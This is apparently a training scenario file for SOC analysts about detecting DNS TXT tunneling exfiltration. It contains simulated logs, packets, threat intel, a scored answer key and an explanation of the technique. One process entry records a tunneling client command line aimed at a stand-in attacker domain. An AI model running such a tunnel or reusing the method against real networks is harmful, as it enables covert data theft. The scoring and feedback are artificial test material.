@@ -1,0 +1,195 @@
+{
+  "id": "SCENARIO_DNS_TUNNEL_01",
+  "title": "High-Entropy DNS TXT Query Tunneling & Data Exfiltration",
+  "category": "dns_tunneling",
+  "severity": "Critical",
+  "trigger_time_offset": 90,
+  "source_ip": "10.0.1.88",
+  "destination_ip": "198.51.100.99",
+  "destination_port": "53 (DNS / UDP)",
+  "protocol": "DNS / UDP",
+  "rule_fired": "SURICATA_DNS_HIGH_ENTROPY_TXT_EXFILTRATION",
+  "hostname": "WS-DEV-14.corp",
+  "summary": "Abnormal volume of high-entropy DNS TXT queries directed to newly registered domain 'tunnel.darkops-c2.cc'. Query payloads contain base64 and hexadecimal chunked records exceeding standard DNS RFC lengths.",
+  "raw_logs": [
+    "2026-10-09T02:06:12Z BIND_NAMED[1410]: client @0x7f9a 10.0.1.88#53124 (chunk01.7a66696c.d41d8cd9.tunnel.darkops-c2.cc): query: chunk01.7a66696c.d41d8cd9.tunnel.darkops-c2.cc IN TXT +E(0) (198.51.100.99)",
+    "2026-10-09T02:06:13Z BIND_NAMED[1410]: client @0x7f9a 10.0.1.88#53125 (chunk02.8b777a1e.9f2b7d41.tunnel.darkops-c2.cc): query: chunk02.8b777a1e.9f2b7d41.tunnel.darkops-c2.cc IN TXT +E(0) (198.51.100.99)",
+    "2026-10-09T02:06:14Z BIND_NAMED[1410]: client @0x7f9a 10.0.1.88#53126 (chunk03.9c888b2f.a03c8e52.tunnel.darkops-c2.cc): query: chunk03.9c888b2f.a03c8e52.tunnel.darkops-c2.cc IN TXT +E(0) (198.51.100.99)",
+    "2026-10-09T02:06:15Z PIHOLE_DNS: Client=10.0.1.88 QueryType=TXT Domain=tunnel.darkops-c2.cc Status=FORWARDED Nameserver=198.51.100.99 ResponseSize=482 bytes",
+    "2026-10-09T02:06:18Z SURICATA_IDS: [1:2024101:1] ET INFO High Entropy Hex/Base64 DNS Subdomain Query Pattern Detected {UDP} 10.0.1.88:53126 -> 198.51.100.99:53",
+    "2026-10-09T02:06:20Z CISCO_ASA: %ASA-6-302015: Built outbound UDP connection 881920 for outside:198.51.100.99/53 to inside:10.0.1.88/53127"
+  ],
+  "logs_categorized": {
+    "dns": [
+      "2026-10-09T02:06:12Z BIND_NAMED: client 10.0.1.88#53124 query: chunk01.7a66696c.d41d8cd9.tunnel.darkops-c2.cc IN TXT +E (198.51.100.99)",
+      "2026-10-09T02:06:13Z BIND_NAMED: client 10.0.1.88#53125 query: chunk02.8b777a1e.9f2b7d41.tunnel.darkops-c2.cc IN TXT +E (198.51.100.99)",
+      "2026-10-09T02:06:14Z BIND_NAMED: client 10.0.1.88#53126 query: chunk03.9c888b2f.a03c8e52.tunnel.darkops-c2.cc IN TXT +E (198.51.100.99)",
+      "2026-10-09T02:06:15Z PIHOLE_DNS: Client=10.0.1.88 QueryType=TXT Domain=tunnel.darkops-c2.cc Status=FORWARDED ResponseSize=482 bytes",
+      "2026-10-09T02:06:16Z BIND_NAMED: client 10.0.1.88#53127 query: chunk04.ad999c30.b14d9f63.tunnel.darkops-c2.cc IN TXT +E (198.51.100.99)"
+    ],
+    "firewall": [
+      "2026-10-09T02:06:12Z CISCO_ASA: %ASA-6-302015: Built outbound UDP connection 881917 for outside:198.51.100.99/53 to inside:10.0.1.88/53124",
+      "2026-10-09T02:06:15Z CISCO_ASA: %ASA-6-302015: Built outbound UDP connection 881919 for outside:198.51.100.99/53 to inside:10.0.1.88/53126",
+      "2026-10-09T02:06:20Z CISCO_ASA: %ASA-6-302015: Built outbound UDP connection 881920 for outside:198.51.100.99/53 to inside:10.0.1.88/53127"
+    ],
+    "auth": [
+      "2026-10-09T02:05:00Z Microsoft-Windows-Security-Auditing: EventID=4624 Keywords=Audit Success TargetUserName=d.vance LogonType=2 Workstation=WS-DEV-14"
+    ],
+    "proxy": [
+      "2026-10-09T02:06:10Z SQUID_PROXY: TCP_DENIED/403 Direct HTTP POST to untrusted external IP blocked; fallback to UDP 53 observed."
+    ]
+  },
+  "pcap_packets": [
+    {
+      "no": 1,
+      "time": "0.000000",
+      "delta": "0.000",
+      "source": "10.0.1.88",
+      "destination": "198.51.100.99",
+      "protocol": "DNS",
+      "length": 158,
+      "flags": "Query [0x1a01]",
+      "info": "Standard query 0x1a01 TXT chunk01.7a66696c.d41d8cd9.tunnel.darkops-c2.cc",
+      "payload_preview": "00 00 01 00 00 01 00 00 07 63 68 75 6e 6b 30 31 08 37 61 36 36 36 39 36 63 08 64 34 31 64 38 63 64 39 06 74 75 6e 6e 65 6c 0a 64 61 72 6b 6f 70 73 2d 63 32 02 63 63 00 00 10 00 01",
+      "details": {
+        "layer_eth": "Source: 00:1a:2b:3c:4d:5e, Destination: 00:0c:29:84:11:02",
+        "layer_ip": "IPv4: 10.0.1.88 -> 198.51.100.99, TTL=64, Protocol=17 (UDP)",
+        "layer_trans": "UDP: Source Port: 53124, Destination Port: 53 (DNS), Length: 124",
+        "layer_app": "DNS: Type TXT (16), Class IN (1), High-entropy hex payload encoded in 3 label segments."
+      }
+    },
+    {
+      "no": 2,
+      "time": "0.045120",
+      "delta": "0.045",
+      "source": "198.51.100.99",
+      "destination": "10.0.1.88",
+      "protocol": "DNS",
+      "length": 482,
+      "flags": "Response [0x1a01]",
+      "info": "Standard query response 0x1a01 TXT \"ACK_CHUNK_01_OK_SEND_NEXT_OFFSET_0x1000\"",
+      "payload_preview": "81 80 00 01 00 01 00 00 00 00 07 63 68 75 6e 6b 30 31 ... 28 41 43 4b 5f 43 48 55 4e 4b 5f 30 31 5f 4f 4b 5f 53 45 4e 44 5f 4e 45 58 54 5f 4f 46 46 53 45 54 5f 30 78 31 30 30 30",
+      "details": {
+        "layer_eth": "Source: 00:0c:29:84:11:02, Destination: 00:1a:2b:3c:4d:5e",
+        "layer_ip": "IPv4: 198.51.100.99 -> 10.0.1.88, TTL=52, Protocol=17 (UDP)",
+        "layer_trans": "UDP: Source Port: 53 (DNS), Destination Port: 53124, Length: 448",
+        "layer_app": "DNS Answer: TXT record confirming receipt and returning command control instructions."
+      }
+    },
+    {
+      "no": 3,
+      "time": "1.021004",
+      "delta": "0.975",
+      "source": "10.0.1.88",
+      "destination": "198.51.100.99",
+      "protocol": "DNS",
+      "length": 164,
+      "flags": "Query [0x1a02]",
+      "info": "Standard query 0x1a02 TXT chunk02.8b777a1e.9f2b7d41.tunnel.darkops-c2.cc",
+      "payload_preview": "00 00 01 00 00 01 00 00 07 63 68 75 6e 6b 30 32 08 38 62 37 37 37 61 31 65 08 39 66 32 62 37 64 34 31 06 74 75 6e 6e 65 6c ...",
+      "details": {
+        "layer_eth": "Source: 00:1a:2b:3c:4d:5e, Destination: 00:0c:29:84:11:02",
+        "layer_ip": "IPv4: 10.0.1.88 -> 198.51.100.99, TTL=64, Protocol=17 (UDP)",
+        "layer_trans": "UDP: Source Port: 53125, Destination Port: 53, Length: 130",
+        "layer_app": "DNS: Type TXT (16), Exfiltration Payload: Encrypted customer database chunk 02."
+      }
+    },
+    {
+      "no": 4,
+      "time": "1.069123",
+      "delta": "0.048",
+      "source": "198.51.100.99",
+      "destination": "10.0.1.88",
+      "protocol": "DNS",
+      "length": 490,
+      "flags": "Response [0x1a02]",
+      "info": "Standard query response 0x1a02 TXT \"ACK_CHUNK_02_OK\"",
+      "payload_preview": "81 80 00 01 00 01 00 00 ...",
+      "details": {
+        "layer_eth": "Source: 00:0c:29:84:11:02, Destination: 00:1a:2b:3c:4d:5e",
+        "layer_ip": "IPv4: 198.51.100.99 -> 10.0.1.88, TTL=52, Protocol=17 (UDP)",
+        "layer_trans": "UDP: Source Port: 53, Destination Port: 53125, Length: 456",
+        "layer_app": "DNS: Server acknowledges exfiltration stream chunk 02."
+      }
+    }
+  ],
+  "threat_intel": {
+    "198.51.100.99": {
+      "ip": "198.51.100.99",
+      "reputation_score": 96,
+      "verdict": "Malicious",
+      "threat_level": "CRITICAL",
+      "asn": "AS49505 (HostBaltic Bulletproof Infrastructure)",
+      "country": "RO",
+      "domain": "tunnel.darkops-c2.cc",
+      "threat_types": ["DNS Tunneling C2", "Data Exfiltration Proxy", "Cobalt Strike Endpoint"],
+      "passive_dns_count": 89,
+      "first_seen": "2026-09-28",
+      "reports_summary": "Identified in recent APT data exfiltration campaigns bypassing egress filtering via port 53 UDP tunneling."
+    },
+    "10.0.1.88": {
+      "ip": "10.0.1.88",
+      "reputation_score": 0,
+      "verdict": "Internal Corporate Asset",
+      "threat_level": "CLEAN",
+      "asn": "RFC 1918 Private Address Space",
+      "country": "LOCAL",
+      "domain": "WS-DEV-14.corp",
+      "threat_types": ["Software Engineering Workstation"],
+      "passive_dns_count": 0,
+      "first_seen": "2025-01-15",
+      "reports_summary": "Internal workstation assigned to developer D. Vance. No prior compromise history."
+    }
+  },
+  "endpoint_processes": [
+    {
+      "pid": 1102,
+      "ppid": 480,
+      "name": "explorer.exe",
+      "user": "CORP\\d.vance",
+      "command": "C:\\Windows\\explorer.exe",
+      "status": "Running",
+      "hash": "c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3",
+      "integrity": "Medium"
+    },
+    {
+      "pid": 6420,
+      "ppid": 1102,
+      "name": "python.exe",
+      "user": "CORP\\d.vance",
+      "command": "\"C:\\Python310\\python.exe\" \"C:\\Users\\d.vance\\AppData\\Local\\Temp\\iodine_client.py\" --server tunnel.darkops-c2.cc --key x99a1",
+      "status": "Running",
+      "hash": "7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c",
+      "integrity": "Medium"
+    },
+    {
+      "pid": 6814,
+      "ppid": 6420,
+      "name": "conhost.exe",
+      "user": "CORP\\d.vance",
+      "command": "\\??\\C:\\Windows\\system32\\conhost.exe 0x4",
+      "status": "Running",
+      "hash": "9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d",
+      "integrity": "Medium"
+    }
+  ],
+  "optimal_action": "Isolate Host",
+  "acceptable_actions": ["Block IP", "Escalate"],
+  "scoring": {
+    "Isolate Host": 150,
+    "Block IP": 80,
+    "Escalate": 75,
+    "Dismiss": -300
+  },
+  "feedback": {
+    "Isolate Host": "CRITICAL CONTAINMENT SUCCESS: WS-DEV-14 isolated via EDR. You spotted the covert DNS TXT tunneling script (iodine_client.py) encoding database records into DNS queries to bypass border firewall egress blocks. Host isolation stopped data loss in its tracks.",
+    "Block IP": "PARTIAL MITIGATION: Blocked DNS server IP 198.51.100.99 at perimeter. However, because the malicious Python process is still executing on WS-DEV-14, the tunneling script can fall back to public resolver forwarders (8.8.8.8, 1.1.1.1) to reach authorative nameservers.",
+    "Escalate": "ACCEPTABLE: Escalated to Tier 2 IR. Live DNS data exfiltration is an emergency requiring immediate endpoint isolation, but escalating ensures forensics teams preserve host memory.",
+    "Dismiss": "CATASTROPHIC BREACH: Dismissed active DNS exfiltration as regular web browsing! The adversary completely exfiltrated 45,000 corporate customer records over covert DNS TXT channels."
+  },
+  "educational_rationale": {
+    "topic": "DNS Tunneling & TXT Record Covert Exfiltration",
+    "certification_relevance": "Security+ SY0-701 (Section 2.1 Covert Channels & Data Exfiltration, Section 4.1 Network Infrastructure Controls) & Network+ (Section 1.3 DNS Resource Records - TXT, CNAME, A)",
+    "deep_dive": "Organizations frequently block outbound HTTP/HTTPS or SSH connections from internal workstations, but permit outbound UDP port 53 to allow DNS resolution. Attackers abuse this by registering a domain (e.g., tunnel.darkops-c2.cc) whose authoritative name server is controlled by them. The client software encodes stolen data into subdomains (e.g., [base64_data].tunnel.darkops-c2.cc) or sends TXT queries. Local resolvers recursively forward these queries up to the attacker's nameserver, enabling bidirectional command-and-control and exfiltration right through perimeter firewalls. Key detection signatures include high query entropy, query lengths exceeding 100 bytes, and abnormally high ratios of TXT queries relative to standard A/AAAA lookups."
+  }
+}
